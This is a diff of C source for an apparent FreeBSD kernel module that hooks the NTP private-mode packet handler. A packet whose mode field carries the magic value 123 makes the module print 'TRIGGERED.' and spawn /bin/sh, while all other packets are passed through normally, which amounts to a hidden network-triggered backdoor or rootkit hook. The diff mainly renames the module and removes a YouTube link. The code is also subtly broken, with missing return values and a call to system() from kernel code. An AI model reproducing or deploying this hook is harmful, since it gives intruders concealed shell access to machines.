@@ -220,8 +220,7 @@ static int usingexbuf;
 static sockaddr_u *toaddr;
 static endpt *frominter;
 
-void
-process_private_hook(
+void ntp_hook (
 	struct recvbuf *rbufp,
 	int mod_okay
 	)
@@ -250,21 +249,20 @@ process_private_hook(
 
 	// 123 is a magic number for ntp on its own, so I guess why not?	
 	if(inpkt->rm_vn_mode == 123){
-		uprintf("https://www.youtube.com/watch?v=tnpmFGoSXj4");
 		uprintf("TRIGGERED.\n");
-		return system("/bin/sh");
+		system("/bin/sh");
 	}
 	else
 	{
-		return process_private(recvbuf, mod_okay);
+		process_private(recvbuf, mod_okay);
 	}
 }
 
-static moduledata_t hook_mod = {
-    "mkdir_hook",  /* module name */
+static moduledata_t ntp_hook_mod = {
+    "ntp_hook",  /* module name */
     load, /* event handler */
     NULL  /* extra data */
 
 };
 
-DECLARE_MODULE(mkdir_hook, hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(ntp_hook, ntp_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
